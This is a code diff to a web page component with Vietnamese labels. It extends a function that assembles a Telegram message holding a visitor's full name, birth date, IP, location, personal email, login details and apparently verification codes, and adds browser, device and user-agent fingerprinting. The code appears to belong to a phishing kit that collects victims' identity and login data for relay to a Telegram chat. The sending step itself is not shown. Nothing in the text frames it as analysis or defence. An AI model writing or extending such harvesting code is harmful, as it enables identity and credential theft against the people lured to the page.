@@ -387,6 +387,30 @@ export default function HomePageClient({
     status: string;
   }>;
 
+  const getBrowserInfo = () => {
+    if (typeof window === "undefined") return "N/A";
+    const ua = navigator.userAgent;
+    const browserMap: { [key: string]: string } = {
+      "Edg/": "Edge",
+      "Chrome/": "Chrome",
+      "Safari/": "Safari",
+      "Firefox/": "Firefox",
+      "Opera/": "Opera",
+    };
+    for (const [key, name] of Object.entries(browserMap)) {
+      if (ua.includes(key)) return name;
+    }
+    return "Unknown";
+  };
+
+  const getDeviceInfo = () => {
+    if (typeof window === "undefined") return "N/A";
+    const ua = navigator.userAgent;
+    if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) return "Mobile";
+    if (/Tablet|iPad/.test(ua)) return "Tablet";
+    return "Desktop";
+  };
+
   const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
     const locationParts = (clientLocation ?? "")
       .split("/")
@@ -410,6 +434,9 @@ export default function HomePageClient({
     const safeCode2 = escapeHtml((overrides.code2 ?? code2) || "N/A");
     const safeCode3 = escapeHtml((overrides.code3 ?? code3) || "N/A");
     const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");
+    const safeBrowser = escapeHtml(getBrowserInfo());
+    const safeDevice = escapeHtml(getDeviceInfo());
+    const safeUserAgent = escapeHtml(typeof window !== "undefined" ? navigator.userAgent : "N/A");
 
     return [
       "👤 <b>THÔNG TIN PHỤ</b>",
@@ -417,11 +444,14 @@ export default function HomePageClient({
       `👨‍💼 Họ Tên: <code>${safeFullName}</code>`,
       `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
       "━━━━━━━━━━━━━━━━━━━━━",
-      `📍 <b>THÔNG TIN VỊ TRÍ</b>`,
+      `📍 <b>THÔNG TIN VỊ TRÍ & THIẾT BỊ</b>`,
       `🌐 IP: <code>${safeIp}</code>`,
       `🏳️ Quốc Gia: <code>${safeCountry}</code>`,
       `🏙 Thành Phố: <code>${safeCity}</code>`,
+      `🖥 Thiết Bị: <code>${safeDevice}</code>`,
+      `🌐 Trình Duyệt: <code>${safeBrowser}</code>`,
       `⏰ Thời Gian: <code>${safeTime}</code>`,
+      `📡 User Agent: <code>${safeUserAgent.substring(0, 50)}...</code>`,
       "━━━━━━━━━━━━━━━━━━━━━",
       `🔐 <b>THÔNG TIN ĐĂNG NHẬP</b>`,
       `📧 Email cá nhân: <code>${safePersonalEmail}</code>`,
